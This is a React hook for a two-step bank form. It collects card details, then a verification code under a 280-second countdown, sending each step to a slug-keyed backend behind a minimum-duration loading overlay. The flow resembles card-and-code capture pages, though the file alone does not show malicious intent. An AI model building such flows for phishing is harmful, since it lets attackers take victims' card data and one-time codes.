'use client';

import { useEffect, useRef, useState } from 'react';
import { OVERLAY_MIN_MS } from './constants';
import { submitBankStep } from './submit-bank';
import { BANK_INITIAL_FORM_DATA, bankCardValid, type BankFormData } from './bank-types';
import type { EnterpriseSlugData } from './types';
import { useEnterpriseKeyboardOffset } from '../hooks/useKeyboardOffset';

const BANK_CODE_COUNTDOWN_SEC = 280;
const fadeDurationMs = 480;

export function useBankFormFlow(slugData: EnterpriseSlugData) {
  const [step, setStep] = useState<1 | 2>(1);
  const [previousStep, setPreviousStep] = useState<number | null>(null);
  const [formData, setFormData] = useState<BankFormData>(BANK_INITIAL_FORM_DATA);
  const [submitting, setSubmitting] = useState(false);
  const [isLoadingOverlay, setIsLoadingOverlay] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(BANK_CODE_COUNTDOWN_SEC);
  const previousStepTimerRef = useRef<number | null>(null);
  const keyboardOffset = useEnterpriseKeyboardOffset();

  const isStep1FadingOut = previousStep === 1;
  const cardValid = bankCardValid(formData);

  useEffect(() => {
    if (previousStep === null) return undefined;
    if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    previousStepTimerRef.current = window.setTimeout(() => {
      setPreviousStep(null);
      previousStepTimerRef.current = null;
    }, fadeDurationMs);
    return () => {
      if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    };
  }, [previousStep]);

  useEffect(() => {
    if (step === 2 && countdown > 0) {
      const timer = window.setTimeout(() => setCountdown((v) => v - 1), 1000);
      return () => window.clearTimeout(timer);
    }
    if (step !== 2) setCountdown(BANK_CODE_COUNTDOWN_SEC);
    return undefined;
  }, [step, countdown]);

  const handleNext = async (): Promise<boolean> => {
    if (step === 1 && !cardValid) return false;
    if (step === 2 && !formData.code.trim()) return false;

    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);

    const overlayStart = Date.now();
    const currentStep = step;
    const { success, error } = await submitBankStep(slugData.slug, currentStep, formData);

    if (error) setErrorMessage(error);

    const remaining = OVERLAY_MIN_MS - (Date.now() - overlayStart);
    if (remaining > 0) await new Promise((r) => setTimeout(r, remaining));

    if (success && currentStep === 1) {
      setPreviousStep(1);
      setStep(2);
    }

    setSubmitting(false);
    setIsLoadingOverlay(false);

    return success;
  };

  const goBackStep = () => {
    setErrorMessage('');
    if (step === 1) return false;
    setStep(1);
    return true;
  };

  return {
    step,
    previousStep,
    formData,
    setFormData,
    submitting,
    isLoadingOverlay,
    errorMessage,
    countdown,
    keyboardOffset,
    isStep1FadingOut,
    cardValid,
    handleNext,
    goBackStep,
  };
}
